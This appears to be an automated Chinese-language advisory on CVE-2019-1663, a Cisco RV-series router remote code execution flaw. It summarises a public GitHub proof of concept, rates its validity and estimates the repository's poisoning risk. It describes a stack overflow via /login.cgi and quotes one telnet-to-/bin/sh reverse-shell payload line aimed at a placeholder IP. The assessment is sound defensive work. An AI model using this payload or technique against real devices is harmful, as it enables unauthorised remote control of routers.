## CVE-2019-1663 - Cisco RV系列路由器远程命令执行漏洞

**漏洞编号:** CVE-2019-1663

**漏洞类型:** 远程命令执行

**影响应用:** Cisco RV110W, RV130W, RV215W

**危害等级:** 高危，未经身份验证的远程攻击者可以在受影响的设备上执行任意代码。

**影响版本:** RV110W < 1.2.2.1, RV130W < 1.0.3.45, RV215W < 1.3.1.1

**利用条件:** 目标设备开启web管理界面且可远程访问，攻击者无需身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于Cisco RV110W, RV130W和RV215W路由器的web管理界面中，由于对用户提供的数据验证不当导致。攻击者可以通过发送恶意HTTP请求到目标设备来利用此漏洞，成功利用后，攻击者可以在受影响设备的底层操作系统上以高权限用户身份执行任意代码。

**漏洞利用方式：**

提供的Python脚本 `exploit-cve-2019-1663.py` 通过向 `/login.cgi` 发送精心构造的HTTP POST请求，其中包含一个恶意`pwd`参数。该`pwd`参数包含一个精心构造的payload，用于覆盖栈上的返回地址，并跳转到libc中的gadget。此gadget用于调用system函数，从而执行任意命令。

`rev_shell.py` 脚本用于建立反向shell，与漏洞利用代码配合使用，在成功利用漏洞后，攻击者可以使用反向shell与目标设备进行交互。

**有效性评估：**

该漏洞利用代码通过构造栈溢出，劫持程序执行流程，调用`system`函数执行任意命令。根据漏洞信息和利用代码，该POC **有效** 。

**投毒风险分析：**

`exploit-cve-2019-1663.py` 本身不包含明显的投毒代码，它的目的是利用漏洞在目标系统上执行命令，`rev_shell.py` 脚本的目的是建立一个反向shell，如果被攻击者利用可能造成信息泄露或者更严重的危害。

经过对代码的分析，发现`/tmp/38924436ff529ab189574b2152bd6292/rev_shell.py`脚本中使用了固定的端口和IP地址`<IP>`，如果用户不修改这些值直接使用该脚本，可能会被攻击者利用。如果攻击者监听相同的端口，就可以获得目标设备的反向shell。
 此外`PAYLOAD += b"telnet <IP> 4444 | /bin/sh | telnet <IP> 4445;#"`中使用了`telnet`命令建立反向shell, `telnet`在传输过程中采用明文传输，容易被嗅探，存在一定的安全风险。

综合来看，此仓库存在轻微的投毒风险，主要是由于脚本中存在不安全的做法，如果用户使用不当可能会被攻击者利用,投毒概率估计为 **5%**。

**项目地址:** [KylVGoi/cve-2019-1663](https://github.com/KylVGoi/cve-2019-1663)

**漏洞详情:** [CVE-2019-1663](https://nvd.nist.gov/vuln/detail/CVE-2019-1663)